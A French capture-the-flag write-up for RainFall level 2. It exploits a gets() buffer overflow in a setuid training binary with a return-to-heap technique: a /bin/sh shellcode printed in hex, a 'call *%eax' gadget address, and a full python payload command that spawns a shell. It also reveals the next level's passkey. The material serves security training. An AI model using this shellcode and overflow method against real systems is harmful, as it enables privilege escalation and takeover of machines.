# RainFall - Level 2

## Passkey for level3
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

## Objectif

Exploiter le binaire `level2` (setuid level3) afin d'obtenir un shell et lire le fichier `/home/user/level3/.pass`.

---

## Analyse du binaire

### Désassemblage de la fonction `p`

```gdb
disas p
```

```asm
0x080484d4 <+0>:    push   %ebp
0x080484d5 <+1>:    mov    %esp,%ebp
0x080484d7 <+3>:    sub    $0x68,%esp
...
0x080484e7 <+19>:   lea    -0x4c(%ebp),%eax      ; buffer = ebp-0x4c (76 octets)
0x080484ed <+25>:   call   0x80483c0 <gets@plt>
0x080484f2 <+30>:   mov    0x4(%ebp),%eax        ; récupère l'adresse de retour
0x080484f5 <+33>:   mov    %eax,-0xc(%ebp)
0x080484f8 <+36>:   mov    -0xc(%ebp),%eax
0x080484fb <+39>:   and    $0xb0000000,%eax
0x08048500 <+44>:   cmp    $0xb0000000,%eax
0x08048505 <+49>:   jne    0x8048527 <p+83>      ; si pas stack → continue
...                                              ; sinon printf + exit
0x08048527 <+83>:   lea    -0x4c(%ebp),%eax
0x0804852d <+89>:   call   0x80483f0 <puts@plt>
0x08048538 <+100>:  call   0x80483e0 <strdup@plt>
0x0804853d <+105>:  leave
0x0804853e <+106>:  ret
```

### Points clés

- Buffer de **76 octets** (`ebp-0x4c`)
- `gets()` → buffer overflow possible
- **Filtre** : si l'adresse de retour est dans la plage stack (`0xb.......`), le programme s'arrête
- Après le filtre : `puts` puis `strdup`
- `strdup` alloue sur le **heap** et copie le buffer. Le pointeur reste dans **`%eax`**

### Problème principal

- La stack est non exécutable (NX)
- Le filtre empêche de retourner sur la stack

Il est donc impossible de placer un shellcode sur la stack et d'y retourner directement.

---

## Solution : Return-to-Heap

### Idée

1. Placer un shellcode dans le buffer
2. `strdup` le copie automatiquement sur le heap
3. Le pointeur vers ce shellcode se trouve dans `%eax`
4. Trouver un gadget `call *%eax` dans le binaire
5. Écraser l'adresse de retour avec l'adresse de ce gadget

### Recherche du gadget

```bash
objdump -d level2 | grep -E "call.*%eax|jmp.*%eax"
```

Résultat :

```
0x080484cf : call *%eax
```

---

## Construction du payload

### Offset

- Buffer : 76 octets
- Saved EBP : 4 octets
- Adresse de retour : 4 octets

→ **80 octets** pour atteindre l'adresse de retour.

### Structure du payload

```
[ shellcode (25 octets) ]
[ padding (51 octets)   ]
[ fake EBP (4 octets)   ]
[ gadget  (4 octets)    ]
```

Total = **84 octets**

### Shellcode

```asm
xor  %eax, %eax
xor  %edx, %edx          ; edx = 0 (envp doit être NULL)
push %eax
push $0x68732f2f         ; "//sh"
push $0x6e69622f         ; "/bin"
mov  %esp, %ebx
push %eax
push %ebx
mov  %esp, %ecx
mov  $0xb, %al
int  $0x80
```

Version hexadécimale :

```
\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Fake EBP

L'instruction `leave` fait :
```asm
mov %ebp, %esp
pop %ebp
```

Il faut donc écraser le saved EBP avec une adresse de stack valide, sinon la stack devient inutilisable pour les `push` du shellcode.

Adresse utilisée (trouvée via GDB) : `0xbffff728`

---

## Payload final

```bash
python -c 'import sys; sys.stdout.write(
"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" +
"A"*51 +
"\x28\xf7\xff\xbf" +
"\xcf\x84\x04\x08"
)' > /tmp/payload
```

Vérification de la taille :

```bash
wc -c /tmp/payload
# doit afficher 84
```

---

## Exploitation

```bash
(cat /tmp/payload; cat) | ./level2
```

Une fois le shell obtenu :

```bash
id
cat /home/user/level3/.pass
```

---

## Vérification sous GDB

```gdb
gdb ./level2
(gdb) b *0x0804853d
(gdb) run < /tmp/payload

(gdb) print /x $eax          # pointeur vers le shellcode sur le heap
(gdb) x/wx $ebp+4            # doit contenir 0x080484cf
(gdb) x/20i $eax             # désassemblage du shellcode
(gdb) c
```

---

## Résumé de la technique

| Étape | Description |
|-------|-------------|
| 1 | Overflow du buffer via `gets` |
| 2 | Shellcode placé au début du buffer |
| 3 | `strdup` copie le shellcode sur le heap et met le pointeur dans `%eax` |
| 4 | Adresse de retour écrasée avec `0x080484cf` (`call *%eax`) |
| 5 | Exécution du shellcode → shell |

Cette technique s'appelle **return-to-heap**.
